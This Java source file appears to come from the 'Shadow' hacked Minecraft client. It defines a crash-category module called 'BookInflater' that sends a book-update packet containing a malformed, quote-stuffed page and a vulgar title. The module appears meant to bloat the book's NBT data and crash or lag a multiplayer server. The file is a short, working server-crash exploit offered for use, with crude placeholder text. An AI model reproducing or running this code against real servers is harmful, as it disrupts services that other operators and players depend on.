/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class StreamCrash extends Module {

    public StreamCrash() {
        super("BookInflater", "Writes a book thats nbt value is 3x bigger than normal", ModuleType.CRASH);
    }

    @Override
    public void tick() {
    }

    @Override
    public void enable() {
        List<String> real = new ArrayList<>();
        real.add("\"cock and balls, also known as \"\"\"\"\"");
        ShadowMain.client.player.networkHandler.sendPacket(new BookUpdateC2SPacket(0, real, Optional.of("cock")));
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
